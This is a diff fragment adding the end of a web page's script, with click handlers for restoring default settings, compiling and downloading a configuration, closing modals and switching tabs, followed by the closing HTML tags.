+        document.getElementById('restoreDefaultSettingsBtn')?.addEventListener('click', () => { if(currentEditingIndex!==-1) { configsList[currentEditingIndex].settings = getDefaultSettings(); openEditModal(currentEditingIndex); showToast('Defaults restored','info'); } });
+        document.getElementById('compileAndDownloadBtn')?.addEventListener('click', async () => { await compileAndDownload(); document.getElementById('editConfigModal').classList.remove('show'); });
+        document.getElementById('closeEditModalBtn')?.addEventListener('click', () => document.getElementById('editConfigModal').classList.remove('show'));
+        document.getElementById('closeInstructionsModal')?.addEventListener('click', () => document.getElementById('compileInstructionsModal').classList.remove('show'));
+        
+        document.querySelectorAll('.nav-tab').forEach(tab => {
+            tab.addEventListener('click', () => switchTab(tab.dataset.tab));
+        });
+    })();
+</script>
+</body>
+</html>
